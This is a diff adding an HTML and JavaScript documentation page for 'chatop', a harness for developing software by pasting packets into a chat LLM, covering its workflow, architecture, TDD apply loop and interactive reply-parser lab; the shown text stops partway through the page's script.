@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>chatop Playbook</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=IBM+Plex+Sans+Condensed:wght@500;600;700&family=IBM+Plex+Sans:ital,wght@0,400;0,600;1,400&display=swap">
+<style>
+/* Layout idea: a field manual. Sticky section rail on the left, one reading column, wide panels for
+   diagrams/transcripts. Three role colours encode WHO acts: you (amber), chatop (teal), the LLM (indigo). */
+:root {
+  --paper: #f7f8f6; --panel: #ffffff; --ink: #18212b; --muted: #5b6672; --line: #dfe3e0;
+  --chatop: #0b7a75; --human: #b26a00; --llm: #4b4fc4; --ok: #2f7d32; --bad: #b3261e;
+  --chatop-soft: #e3f2f0; --human-soft: #fbefdc; --llm-soft: #e9e9fb; --code: #f0f2ef;
+  --display: "IBM Plex Sans Condensed", "Arial Narrow", system-ui, sans-serif;
+  --body: "IBM Plex Sans", system-ui, -apple-system, "Segoe UI", sans-serif;
+  --mono: "IBM Plex Mono", ui-monospace, Menlo, Consolas, monospace;
+  color-scheme: light;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --paper: #12161b; --panel: #192027; --ink: #e5e9ec; --muted: #9aa6b0; --line: #2a333c;
+    --chatop: #3cc1b8; --human: #f0a540; --llm: #9a9df5; --ok: #7cc47f; --bad: #f2867e;
+    --chatop-soft: #15302e; --human-soft: #33270f; --llm-soft: #23244a; --code: #10151a; color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --paper: #12161b; --panel: #192027; --ink: #e5e9ec; --muted: #9aa6b0; --line: #2a333c;
+  --chatop: #3cc1b8; --human: #f0a540; --llm: #9a9df5; --ok: #7cc47f; --bad: #f2867e;
+  --chatop-soft: #15302e; --human-soft: #33270f; --llm-soft: #23244a; --code: #10151a; color-scheme: dark;
+}
+* { box-sizing: border-box; }
+html, body { margin: 0; background: var(--paper); color: var(--ink); font: 15.5px/1.6 var(--body); }
+a { color: var(--chatop); }
+a:focus-visible, button:focus-visible, summary:focus-visible, textarea:focus-visible { outline: 2px solid var(--chatop); outline-offset: 2px; }
+.shell { display: grid; grid-template-columns: 230px minmax(0, 1fr); gap: 0; max-width: 1320px; margin: 0 auto; }
+nav.rail { position: sticky; top: 0; height: 100vh; overflow-y: auto; padding: 28px 18px; border-right: 1px solid var(--line); }
+nav.rail .brand { font: 700 22px/1 var(--display); letter-spacing: .01em; margin-bottom: 4px; }
+nav.rail .brand span { color: var(--chatop); }
+nav.rail .tag { color: var(--muted); font-size: 12.5px; margin-bottom: 22px; }
+nav.rail ol { list-style: none; padding: 0; margin: 0; counter-reset: s; display: grid; gap: 2px; }
+nav.rail li a { display: flex; gap: 8px; padding: 5px 8px; border-radius: 6px; text-decoration: none; color: var(--ink); font-size: 14px; }
+nav.rail li a::before { counter-increment: s; content: counter(s, decimal-leading-zero); color: var(--muted); font: 12px/1.9 var(--mono); }
+nav.rail li a:hover { background: var(--chatop-soft); }
+.legend { margin-top: 22px; display: grid; gap: 6px; font-size: 12.5px; color: var(--muted); }
+.dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 6px; vertical-align: middle; }
+main { padding: 28px 36px 80px; min-width: 0; }
+section { padding: 26px 0 30px; border-bottom: 1px solid var(--line); }
+h1, h2, h3, h4 { font-family: var(--display); text-wrap: balance; line-height: 1.2; }
+h1 { font-size: 40px; margin: 0 0 8px; }
+h2 { font-size: 28px; margin: 0 0 12px; }
+h3 { font-size: 20px; margin: 22px 0 8px; }
+h4 { font-size: 16.5px; margin: 18px 0 6px; }
+p, li { max-width: 72ch; }
+.lede { font-size: 18px; color: var(--muted); max-width: 70ch; }
+code, pre, .mono { font-family: var(--mono); font-size: 13px; }
+:not(pre) > code { background: var(--code); padding: 1px 5px; border-radius: 4px; }
+pre { background: var(--code); border: 1px solid var(--line); border-radius: 8px; padding: 12px 14px; overflow-x: auto; line-height: 1.45; position: relative; max-width: 100%; }
+pre .copy { position: absolute; top: 6px; right: 6px; }
+table { border-collapse: collapse; font-size: 14px; margin: 10px 0; }
+.tablewrap { overflow-x: auto; max-width: 100%; }
+th, td { border-bottom: 1px solid var(--line); padding: 6px 10px; text-align: left; vertical-align: top; }
+th { font-family: var(--display); font-weight: 600; background: var(--panel); }
+button, .btn { font: 600 13px var(--body); padding: 6px 12px; border-radius: 7px; border: 1px solid var(--line); background: var(--panel); color: var(--ink); cursor: pointer; }
+button:hover { border-color: var(--chatop); }
+button.on { background: var(--chatop); border-color: var(--chatop); color: #fff; }
+.grid { display: grid; gap: 14px; }
+.cards { grid-template-columns: repeat(auto-fit, minmax(210px, 1fr)); }
+.card { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 14px 16px; }
+.card h4 { margin-top: 0; }
+.stat { font: 700 30px/1 var(--display); font-variant-numeric: tabular-nums; }
+.muted { color: var(--muted); }
+.panel { background: var(--panel); border: 1px solid var(--line); border-radius: 12px; padding: 16px; }
+.diagram { overflow-x: auto; }
+.diagram svg { display: block; width: 100%; min-width: 680px; height: auto; }
+svg text { font-family: var(--body); fill: var(--ink); }
+svg .lbl { font-size: 13px; } svg .small { font-size: 11px; fill: var(--muted); } svg .title { font: 600 14px var(--display); }
+.layer { cursor: pointer; } .layer rect { transition: stroke-width .15s; } .layer:hover rect, .layer.sel rect { stroke-width: 3; }
+.trackpick { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin: 12px 0 16px; }
+.trackpick button { text-align: left; padding: 12px 14px; line-height: 1.35; font-weight: 400; }
+.trackpick button b { display: block; font: 600 16px var(--display); margin-bottom: 2px; }
+.trackpick button.on b, .trackpick button.on span { color: #fff; }
+.pipeline { display: flex; flex-wrap: wrap; gap: 6px; align-items: center; margin: 10px 0 18px; }
+.chip { font: 600 12.5px var(--mono); padding: 4px 9px; border-radius: 99px; border: 1px solid var(--line); background: var(--panel); }
+.chip.gate { border-color: var(--human); color: var(--human); }
+.chip.loop::after { content: " ⟲"; color: var(--chatop); }
+.arrow { color: var(--muted); }
+.steps { display: grid; gap: 8px; }
+.step { display: grid; grid-template-columns: 92px minmax(0, 1fr); gap: 12px; padding: 10px 12px; border-radius: 10px; border: 1px solid var(--line); background: var(--panel); border-left-width: 5px; }
+.step.human { border-left-color: var(--human); } .step.llm { border-left-color: var(--llm); } .step.check { border-left-color: var(--chatop); }
+.who { font: 600 11.5px/1.3 var(--mono); text-transform: uppercase; letter-spacing: .05em; }
+.step.human .who { color: var(--human); } .step.llm .who { color: var(--llm); } .step.check .who { color: var(--chatop); }
+.step .cmd { font: 600 13.5px var(--mono); overflow-wrap: anywhere; }
+.step .note { color: var(--muted); font-size: 13.5px; margin: 2px 0 4px; }
+.step pre { margin: 6px 0 0; font-size: 12px; max-height: 340px; }
+details { margin-top: 6px; } summary { cursor: pointer; font-size: 13px; color: var(--chatop); font-weight: 600; }
+.tabs { display: flex; flex-wrap: wrap; gap: 6px; margin: 8px 0 12px; }
+.play { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); gap: 14px; }
+.play textarea { width: 100%; min-height: 420px; font: 12.5px/1.45 var(--mono); background: var(--code); color: var(--ink); border: 1px solid var(--line); border-radius: 8px; padding: 10px; resize: vertical; }
+.ok { color: var(--ok); } .bad { color: var(--bad); }
+.pill { display: inline-block; font: 600 11.5px var(--mono); padding: 1px 7px; border-radius: 99px; background: var(--chatop-soft); color: var(--chatop); }
+.pill.test { background: var(--human-soft); color: var(--human); } .pill.doc { background: var(--llm-soft); color: var(--llm); }
+.acc details { border: 1px solid var(--line); border-radius: 10px; background: var(--panel); padding: 8px 14px; margin: 8px 0; }
+.acc summary { font: 600 16px var(--display); color: var(--ink); }
+.tree { font: 13px/1.55 var(--mono); }
+.tree .ann { color: var(--muted); font-family: var(--body); font-size: 12.5px; margin-left: 8px; }
+.callout { border-left: 4px solid var(--chatop); background: var(--chatop-soft); padding: 10px 14px; border-radius: 0 8px 8px 0; margin: 12px 0; }
+.flow { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 8px; counter-reset: f; }
+.flow div { border: 1px solid var(--line); border-radius: 10px; padding: 10px; background: var(--panel); border-top-width: 4px; font-size: 13.5px; }
+.flow div b { display: block; font-family: var(--display); }
+.flow .h { border-top-color: var(--human); } .flow .c { border-top-color: var(--chatop); } .flow .l { border-top-color: var(--llm); }
+@media (max-width: 860px) {
+  .shell { grid-template-columns: 1fr; }
+  nav.rail { position: static; height: auto; border-right: 0; border-bottom: 1px solid var(--line); }
+  main { padding: 16px; }
+  .play { grid-template-columns: 1fr; }
+  .step { grid-template-columns: 1fr; }
+}
+@media (prefers-reduced-motion: reduce) { * { transition: none !important; } }
+</style>
+</head>
+<body>
+<div class="shell">
+<nav class="rail" aria-label="Sections">
+  <div class="brand">chat<span>op</span></div>
+  <div class="tag">Develop software with a chat LLM, copy &amp; paste only</div>
+  <ol>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#turns">Turn economics</a></li>
+    <li><a href="#usecases">Use-case walkthroughs</a></li>
+    <li><a href="#architecture">Architecture</a></li>
+    <li><a href="#decisions">Decisions</a></li>
+    <li><a href="#contract">Reply contract lab</a></li>
+    <li><a href="#prompts">Prompts</a></li>
+    <li><a href="#kit">The kit</a></li>
+    <li><a href="#setup">Setup &amp; getting started</a></li>
+    <li><a href="#labs">Labs</a></li>
+    <li><a href="#playbook">Full playbook</a></li>
+  </ol>
+  <div class="legend" aria-label="Role colours">
+    <div><span class="dot" style="background:var(--human)"></span>You (copy, paste, decide)</div>
+    <div><span class="dot" style="background:var(--chatop)"></span>chatop (context, apply, verify)</div>
+    <div><span class="dot" style="background:var(--llm)"></span>Chat LLM (think, write)</div>
+  </div>
+</nav>
+<main>
+
+<section id="overview">
+  <h1>chatop: a harness for copy-and-paste development</h1>
+  <p class="lede">No coding agent, just a chat window. chatop keeps the project memory in your repo and builds each
+  packet you paste, with code context found by <code>codegraph</code>. It applies the LLM's one-block reply
+  atomically, proves TDD red then green, runs your checks and commits. Then the next packet is already on your clipboard.</p>
+  <div class="flow" aria-label="One turn">
+    <div class="h"><b>1 · Paste</b>The packet is already on your clipboard. Paste it into Claude, ChatGPT or Gemini.</div>
+    <div class="l"><b>2 · LLM replies</b>One <code>````chatop</code> block with tests, code, docs, questions and context requests.</div>
+    <div class="h"><b>3 · Copy</b>Click the copy button on that block. <code>chatop watch</code> sees it.</div>
+    <div class="c"><b>4 · Apply</b>Validate paths and edits in memory, then write atomically, or put a repair prompt on the clipboard.</div>
+    <div class="c"><b>5 · Verify</b>Tests alone must fail, then with the code all checks must pass. Commit the slice.</div>
+    <div class="c"><b>6 · Next packet</b>Evidence, state and codegraph context assembled and copied. Back to 1.</div>
+  </div>
+  <h3>Measured in the lab replays</h3>
+  <p class="muted">These numbers were recorded when this page was built, by replaying each lab's reference replies through the real app (real git, pytest and mypy). Packet sizes exclude codegraph context, which was not installed in the build environment; with codegraph, slice packets grow by the pre-loaded symbols and repo map.</p>
+  <div class="grid cards" id="metrics"></div>
+</section>
+
+<section id="turns">
+  <h2>Turn economics</h2>
+  <p>A turn is one copy into the chat and one copy back. That is the only cost a human feels, so every design choice
+  either removes a turn or removes thinking from a turn.</p>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Waste in plain chat development</th><th>chatop technique</th><th>Effect</th></tr></thead>
+    <tbody>
+      <tr><td>Re-explaining the project in every new chat</td><td>Self-contained packets; repo-as-memory (<code>.chatop/state.json</code>, <code>docs/</code>)</td><td>A fresh chat per phase costs nothing</td></tr>
+      <tr><td>"Paste me file X" round-trips</td><td>Slices declare <code>touches</code>; codegraph pre-loads files, symbols, callers and affected tests</td><td>The context is there on the first try</td></tr>
+      <tr><td>Serial questions</td><td><code>@@ask</code> batches with recommended options pre-checked; <code>chatop accept</code></td><td>One decision round instead of many</td></tr>
+      <tr><td>Hand-applying code; partial applies</td><td>One envelope; SEARCH/REPLACE edits; atomic, validated apply</td><td>Zero manual edits; never half-applied</td></tr>
+      <tr><td>A separate "red" turn for TDD</td><td>Two-stage apply: tests first must fail, then the code must pass</td><td>Verified TDD in one turn</td></tr>
+      <tr><td>Copying error logs by hand</td><td>Failing check output goes into the next packet automatically</td><td>Retries need no human analysis</td></tr>
+      <tr><td>Vague "that didn't work" retries</td><td>Precise repair prompts (stale turn, missing SEARCH, protected path, truncation)</td><td>The fix-up costs one paste</td></tr>
+      <tr><td>Terminal context switches</td><td>Clipboard ping-pong (<code>chatop watch</code>, TUI <kbd>w</kbd>, web toggle)</td><td>The loop is just paste and copy</td></tr>
+    </tbody>
+  </table></div>
+</section>
+
+<section id="usecases">
+  <h2>Use-case walkthroughs</h2>
+  <p>Pick your situation. Each walkthrough is a real transcript recorded from the matching lab: the commands you type,
+  what chatop prints, the exact packet you would paste, and a reference LLM reply.</p>
+  <div class="trackpick" id="trackpick" role="tablist"></div>
+  <div id="trackinfo"></div>
+  <div class="pipeline" id="pipeline"></div>
+  <div class="steps" id="steps"></div>
+</section>
+
+<section id="architecture">
+  <h2>Architecture</h2>
+  <p>Ports and adapters with a single facade. Click a layer to see what it owns, its surface, and what it may import.
+  Narrow boundaries keep every change local: a new code-search tool is one adapter, and a new UI is one thin shell.</p>
+  <div class="panel diagram">
+  <svg viewBox="0 0 900 470" role="img" aria-label="chatop layered architecture">
+    <defs><marker id="ah" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="var(--muted)"/></marker></defs>
+    <g class="layer" data-k="ui"><rect x="20" y="16" width="860" height="70" rx="10" fill="var(--human-soft)" stroke="var(--human)" stroke-width="1.5"/>
+      <text x="36" y="40" class="title">ui/: thin shells (no logic)</text>
+      <text x="36" y="66" class="lbl">cli.py · argparse    tui.py · Textual    web.py · FastAPI + static/index.html (127.0.0.1)</text></g>
+    <line x1="450" y1="86" x2="450" y2="116" stroke="var(--muted)" marker-end="url(#ah)"/>
+    <g class="layer" data-k="app"><rect x="20" y="118" width="860" height="78" rx="10" fill="var(--chatop-soft)" stroke="var(--chatop)" stroke-width="1.5"/>
+      <text x="36" y="142" class="title">app/: Session facade (the only API UIs call)</text>
+      <text x="36" y="168" class="lbl">build_packet · apply · answer · accept_recommended · approve · reject · feature · undo · watch_tick · status …</text>
+      <text x="36" y="186" class="small">workspace.py (root-confined fs, .chatop memory) · recon.py (LLM-free probes) · config.py · wiring.py (composition root)</text></g>
+    <line x1="230" y1="196" x2="230" y2="228" stroke="var(--muted)" marker-end="url(#ah)"/>
+    <line x1="670" y1="196" x2="670" y2="228" stroke="var(--muted)" marker-end="url(#ah)"/>
+    <g class="layer" data-k="domain"><rect x="20" y="230" width="420" height="120" rx="10" fill="var(--panel)" stroke="var(--llm)" stroke-width="1.5"/>
+      <text x="36" y="254" class="title">domain/: pure, no I/O</text>
+      <text x="36" y="280" class="lbl">reply.py: envelope parser</text>
+      <text x="36" y="300" class="lbl">changes.py: path guard + in-memory edits</text>
+      <text x="36" y="320" class="lbl">packet.py: priority budgeter</text>
+      <text x="36" y="340" class="lbl">workflow.py: tracks, gates, slice loop</text></g>
+    <g class="layer" data-k="ports"><rect x="460" y="230" width="420" height="120" rx="10" fill="var(--panel)" stroke="var(--chatop)" stroke-width="1.5" stroke-dasharray="5 4"/>
+      <text x="476" y="254" class="title">ports.py: Protocols</text>
+      <text x="476" y="280" class="lbl">CodeIndex (9 methods)</text>
+      <text x="476" y="300" class="lbl">Clipboard (copy, paste)</text>
+      <text x="476" y="320" class="lbl">Runner (run configured check)</text>
+      <text x="476" y="340" class="lbl">Vcs (commit, files, churn, log)</text></g>
+    <line x1="670" y1="378" x2="670" y2="352" stroke="var(--muted)" marker-end="url(#ah)"/>
+    <g class="layer" data-k="adapters"><rect x="460" y="380" width="420" height="72" rx="10" fill="var(--panel)" stroke="var(--chatop)" stroke-width="1.5"/>
+      <text x="476" y="404" class="title">adapters/: one per external system</text>
+      <text x="476" y="428" class="lbl">codegraph.py · clipboard.py · runner.py · git.py</text>
+      <text x="476" y="444" class="small">codegraph CLI · pbcopy/wl-copy/xclip/file · sh · git</text></g>
+    <g class="layer" data-k="tests"><rect x="20" y="380" width="420" height="72" rx="10" fill="var(--panel)" stroke="var(--human)" stroke-width="1.5" stroke-dasharray="2 4"/>
+      <text x="36" y="404" class="title">tests/: TDD at every layer</text>
+      <text x="36" y="428" class="lbl">domain · adapters · app (use cases) · ui · e2e (labs)</text>
+      <text x="36" y="444" class="small">fakes implement the same Protocols as the real adapters</text></g>
+  </svg>
+  </div>
+  <div class="panel" id="layerinfo" style="margin-top:12px" aria-live="polite"></div>
+  <h3>Workflow state machine</h3>
+  <div class="panel diagram">
+  <svg viewBox="0 0 900 250" role="img" aria-label="Phase state machine for the four tracks">
+    <g font-size="12.5">
+      <text x="10" y="34" class="title">new</text>
+      <text x="10" y="94" class="title">continue</text>
+      <text x="10" y="154" class="title">adopt</text>
+      <text x="10" y="214" class="title">audit</text>
+    </g>
+    <g id="sm"></g>
+  </svg>
+  </div>
+  <p class="muted">Amber outline = human approval gate. ⟲ = the phase loops (refine rounds, slice attempts, slice after slice).
+  A finished track goes to <code>done</code>; <code>chatop feature</code> starts the continue track from there.</p>
+  <h3>Boundary surfaces</h3>
+  <div id="archdoc"></div>
+</section>
+
+<section id="decisions">
+  <h2>Decisions and reasons</h2>
+  <p>Every structural choice, with the alternatives that were rejected. Rendered from <code>docs/DECISIONS.md</code>.</p>
+  <div class="acc" id="adrs"></div>
+</section>
+
+<section id="contract">
+  <h2>Reply contract lab</h2>
+  <p>The LLM must answer with exactly one envelope. Edit the reply on the left. The parser on the right is a
+  JavaScript port of <code>chatop/domain/reply.py</code> and shows what chatop would apply. Try breaking it: delete
+  <code>&lt;&lt;&lt;END&gt;&gt;&gt;</code>, write to <code>.chatop/</code>, or use an unknown directive.</p>
+  <div class="tabs" id="samples"></div>
+  <div class="play">
+    <div><label for="replyIn" class="muted">LLM reply</label><textarea id="replyIn" spellcheck="false"></textarea></div>
+    <div><div class="muted">What chatop sees</div><div id="parsed" class="panel" aria-live="polite"></div></div>
+  </div>
+</section>
+
+<section id="prompts">
+  <h2>Prompts</h2>
+  <p>These are the exact templates chatop assembles into packets (<code>src/chatop/prompts/</code>). Every packet is
+  <code>system</code> + the phase prompt + <code>contract</code> + state + human input + evidence + docs + code
+  context + repo map, cut to the token budget by priority. <code>$name</code> placeholders are filled per turn.
+  You don't paste these by hand; chatop does. They're shown so you can audit and tune them.</p>
+  <div class="tabs" id="ptabs" role="tablist"></div>
+  <pre id="ptext"></pre>
+</section>
+
+<section id="kit">
+  <h2>The kit</h2>
+  <div class="grid cards">
+    <div class="card"><h4>chatop app</h4>Python ≥3.11, typed (mypy --strict). CLI, Textual TUI, and FastAPI web UI over one facade.</div>
+    <div class="card"><h4>codegraph CLI</h4><code>@colbymchenry/codegraph</code>: every code lookup (query, callers, callees, impact, affected, files).</div>
+    <div class="card"><h4>Project memory</h4><code>.chatop/</code> state, config, journal; <code>docs/</code> IDEA → PRD → SPEC → PLAN, AS-BUILT, AUDIT, FEATURE.</div>
+    <div class="card"><h4>Labs</h4>Four replayable labs with seeds and reference replies; they are also e2e tests.</div>
+  </div>
+  <h3>Repository layout</h3>
+  <div class="panel tree" id="tree"></div>
+</section>
+
+<section id="setup"><h2>Setup &amp; getting started</h2><div id="gs"></div></section>
+<section id="labs"><h2>Labs</h2><div id="labsdoc"></div></section>
+<section id="playbook"><h2>Full playbook</h2><div id="pb"></div></section>
+
+<p class="muted" style="margin-top:28px">Source, issues and downloads: <a href="https://github.com/nycnighthawk/chat-op-devkit">github.com/nycnighthawk/chat-op-devkit</a>. This page is generated by <code>scripts/build_playbook.py</code>.</p>
+</main>
+</div>
+
+<script>
+const DATA = /*__CHATOP_DATA__*/null;
+const $ = (id) => document.getElementById(id);
+const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
+const tok = (s) => Math.ceil(s.length / 4);
+const plural = (n, w) => n + " " + w + (n === 1 ? "" : "s");
+
+/* ---------- tiny markdown renderer (headings, lists, tables, fences, quotes, inline) ---------- */
+function inline(s) {
+  s = esc(s);
+  s = s.replace(/`([^`]+)`/g, (_, c) => "<code>" + c + "</code>");
+  s = s.replace(/\*\*([^*]+)\*\*/g, "<strong>$1</strong>");
+  s = s.replace(/(^|[^*])\*([^*\s][^*]*)\*/g, "$1<em>$2</em>");
+  s = s.replace(/\[([^\]]+)\]\(([^)\s]+)\)/g, (_, t, u) => {
+    const href = /^https?:/.test(u) ? u : "https://github.com/nycnighthawk/chat-op-devkit/blob/main/docs/" + u;
+    return '<a href="' + href + '">' + t + "</a>";
+  });
+  return s;
+}
+function md(src, shift) {
+  shift = shift || 0;
+  const L = src.replace(/\r\n/g, "\n").split("\n");
+  let out = [], i = 0;
+  while (i < L.length) {
+    const ln = L[i];
+    const fence = ln.match(/^(`{3,})(\w*)/);
+    if (fence) {
+      const f = fence[1]; let j = i + 1; const body = [];
+      while (j < L.length && !L[j].startsWith(f)) body.push(L[j++]);
+      out.push(codeBlock(body.join("\n"), fence[2])); i = j + 1; continue;
+    }
+    const h = ln.match(/^(#{1,4})\s+(.*)/);
+    if (h) { const n = Math.min(4, h[1].length + shift); out.push(`<h${n}>${inline(h[2])}</h${n}>`); i++; continue; }
+    if (/^\|/.test(ln)) {
+      const rows = []; while (i < L.length && /^\|/.test(L[i])) rows.push(L[i++]);
+      const cells = (r) => r.replace(/^\||\|$/g, "").split(/(?<!\\)\|/).map((c) => inline(c.trim().replace(/\\\|/g, "|")));
+      const head = cells(rows[0]); const body = rows.slice(2).map(cells);
+      out.push('<div class="tablewrap"><table><thead><tr>' + head.map((c) => "<th>" + c + "</th>").join("") + "</tr></thead><tbody>" +
+        body.map((r) => "<tr>" + r.map((c) => "<td>" + c + "</td>").join("") + "</tr>").join("") + "</tbody></table></div>");
+      continue;
+    }
+    if (/^\s*([-*]|\d+\.)\s+/.test(ln)) {
+      const ordered = /^\s*\d+\./.test(ln); const items = [];
+      while (i < L.length && (/^\s*([-*]|\d+\.)\s+/.test(L[i]) || (/^\s{2,}\S/.test(L[i]) && items.length))) {
+        if (/^\s*([-*]|\d+\.)\s+/.test(L[i])) items.push(L[i].replace(/^\s*([-*]|\d+\.)\s+/, ""));
+        else items[items.length - 1] += " " + L[i].trim();
+        i++;
+      }
+      out.push((ordered ? "<ol>" : "<ul>") + items.map((t) => "<li>" + inline(t) + "</li>").join("") + (ordered ? "</ol>" : "</ul>"));
+      continue;
+    }
+    if (/^>\s?/.test(ln)) { const q = []; while (i < L.length && /^>\s?/.test(L[i])) q.push(L[i++].replace(/^>\s?/, "")); out.push('<div class="callout">' + inline(q.join(" ")) + "</div>"); continue; }
+    if (/^---+\s*$/.test(ln) || !ln.trim()) { i++; continue; }
+    const para = []; while (i < L.length && L[i].trim() && !/^(#{1,4}\s|\||`{3,}|\s*([-*]|\d+\.)\s|>)/.test(L[i])) para.push(L[i++]);
+    out.push("<p>" + inline(para.join(" ")) + "</p>");
+  }
+  return out.join("\n");
+}
+function codeBlock(text, lang) {
+  const label = lang === "mermaid" ? '<div class="muted" style="font-size:12px">diagram source (mermaid); see the drawings above</div>' : "";
+  return label + '<pre><button class="copy" type="button">Copy</button><code>' + esc(text) + "</code></pre>";
+}
+document.addEventListener("click", async (e) => {
+  const b = e.target.closest("button.copy");
+  if (!b) return;
+  const text = b.dataset.text !== undefined ? b.dataset.text : b.parentElement.querySelector("code").textContent;
+  try { await navigator.clipboard.writeText(text); b.textContent = "Copied"; } catch (err) { b.textContent = "Select + copy"; }
+  setTimeout(() => (b.textContent = "Copy"), 1500);
+});
+
+/* ---------- metrics from recorded lab transcripts ---------- */
+const LABMETA = {
+  "new-project": { title: "New project", sub: "From a vague idea to PRD, SPEC, plan and slices", track: "new" },
+  "continue-feature": { title: "Continue a chatop project", sub: "Add a feature; recover from a failing attempt", track: "continue" },
+  "adopt": { title: "Unknown, agent-built", sub: "Reverse-document, then extend", track: "adopt" },
+  "audit": { title: "Unknown quality", sub: "Recon, audit, characterize, fix", track: "audit" },
+};
+function labStats(steps) {
+  const replies = steps.filter((s) => s.verb === "reply");
+  const outs = steps.map((s) => s.output || "").join("\n");
+  const sizes = replies.map((s) => tok(s.packet || ""));
+  return {
+    turns: replies.length,
+    slices: (outs.match(/slice \S+ complete/g) || []).length,
+    red: (outs.match(/TDD red step: proven/g) || []).length,
+    fails: (outs.match(/check \w+: FAIL/g) || []).length,
+    avg: sizes.length ? Math.round(sizes.reduce((a, b) => a + b, 0) / sizes.length) : 0,
+    max: sizes.length ? Math.max(...sizes) : 0,
+    human: steps.filter((s) => s.verb === "chatop").length,
+  };
+}
+function renderMetrics() {
+  const box = $("metrics");
+  if (!DATA || !Object.keys(DATA.labs).length) { box.innerHTML = '<div class="card muted">Build with scripts/build_playbook.py to embed lab measurements.</div>'; return; }
+  box.innerHTML = Object.entries(DATA.labs).map(([k, steps]) => {
+    const s = labStats(steps);
+    return `<div class="card"><h4>${esc(LABMETA[k].title)}</h4><div class="stat">${s.turns}</div><div class="muted">LLM turns</div>
+      <div style="margin-top:8px;font-size:13.5px">${plural(s.slices, "slice")} committed · ${plural(s.red, "TDD red")} proven · ${plural(s.fails, "failing check")} fed back<br>
+      packets avg ~${s.avg.toLocaleString()} / max ~${s.max.toLocaleString()} tokens</div></div>`;
+  }).join("");
+}
+
+/* ---------- walkthroughs ---------- */
+const PIPES = {
+  new: [["idea"], ["refine", "loop"], ["prd", "gate"], ["spec", "gate"], ["plan", "gate"], ["slice", "loop"], ["done"]],
+  continue: [["feature"], ["refine", "loop"], ["delta", "gate"], ["plan", "gate"], ["slice", "loop"], ["done"]],
+  adopt: [["recon"], ["done"], ["→ feature (continue track)"]],
+  audit: [["recon"], ["audit", "gate"], ["plan", "gate"], ["slice", "loop"], ["done"]],
+};
+const TRACKINFO = {
+  new: "Use when there is no code yet. The LLM refines the idea with batched, recommended-answer questions, then writes the PRD (testable ACs), the SPEC (typed boundaries, ADRs, proposed checks) and a vertical-slice plan. Each slice is one reply: tests, code, docs.",
+  continue: "Use on a project chatop already manages (or one you adopted). The packet carries every prior decision, the slices, SPEC/AS-BUILT and the repo map, so the feature extends the system instead of reinventing it. This transcript includes a failing attempt and its code-only fix.",
+  adopt: "Use for code other agents wrote that looks healthy (tests exist and a test command is detected). Local recon (agent fingerprints, instruction files, hotspots, codegraph map) feeds an AS-BUILT document. Then add features.",
+  audit: "Use when quality is unknown: no tests, failing tests, or claims you can't verify. Audit produces a risk register and test-gap map; stabilization slices pin current behavior with characterization tests before any fix.",
+};
+let curLab = "new-project";
+function renderTrackPick() {
+  $("trackpick").innerHTML = Object.entries(LABMETA).map(([k, m]) =>
+    `<button type="button" role="tab" aria-selected="${k === curLab}" class="${k === curLab ? "on" : ""}" data-lab="${k}"><b>${esc(m.title)}</b><span>${esc(m.sub)}</span></button>`).join("");
+  $("trackpick").querySelectorAll("button").forEach((b) => (b.onclick = () => { curLab = b.dataset.lab; renderTrackPick(); renderLab(); }));
+}
+function renderLab() {
+  const meta = LABMETA[curLab];
+  $("trackinfo").innerHTML = `<p><strong>Track <code>${meta.track}</code>.</strong> ${esc(TRACKINFO[meta.track])}</p>`;
+  $("pipeline").innerHTML = PIPES[meta.track].map(([p, k], i) => (i ? '<span class="arrow">→</span>' : "") + `<span class="chip ${k || ""}">${esc(p)}</span>`).join("");
+  const steps = (DATA && DATA.labs[curLab]) || [];
+  if (!steps.length) { $("steps").innerHTML = '<p class="muted">No transcript embedded.</p>'; return; }
+  $("steps").innerHTML = steps.filter((s) => !s.verb.startsWith("expect")).map((s) => {
+    const note = s.comment ? `<div class="note">${esc(s.comment)}</div>` : "";
+    if (s.verb === "reply") {
+      return `<div class="step llm"><div class="who">LLM<br>turn ${s.turn}</div><div>${note}
+        <div class="cmd">You paste packet ${s.turn} (~${tok(s.packet).toLocaleString()} tokens); the LLM answers; you copy the block</div>
+        <details><summary>Packet ${s.turn}: exactly what gets pasted</summary><pre><button class="copy" type="button">Copy</button><code>${esc(s.packet)}</code></pre></details>
+        <details><summary>Reference reply</summary><pre><button class="copy" type="button">Copy</button><code>${esc(s.reply)}</code></pre></details>
+        <div class="who" style="color:var(--chatop);margin-top:8px">chatop applies</div><pre>${esc((s.output || "").trim())}</pre></div></div>`;
+    }
+    if (s.verb === "seed" || s.verb === "run-lab") {
+      return `<div class="step check"><div class="who">setup</div><div>${note}<div class="cmd">${esc(s.line)}</div></div></div>`;
+    }
+    return `<div class="step human"><div class="who">You</div><div>${note}<div class="cmd">$ ${esc(s.line)}</div>${s.output && s.output.trim() ? `<pre>${esc(s.output.trim())}</pre>` : ""}</div></div>`;
+  }).join("");
+}
+
+/* ---------- architecture ---------- */
+const LAYERS = {
+  ui: ["ui/: thin shells", "Parse input, call Session, render output. No business rules, so they are tested shallowly: CLI via main(argv, factory), web via TestClient, TUI via the Textual pilot.", "May import: app, domain.models (enums)."],
+  app: ["app/: Session facade", "Owns the use cases: build_packet, apply (two-stage TDD), answers, gates, feature, undo, watch_tick, status, doctor. Workspace confines file access to the repo root and owns .chatop/. Recon gathers cheap local facts (no LLM, no text grep). wiring.py is the only place that names concrete adapters.", "May import: domain, ports. Never adapters (except wiring.py)."],
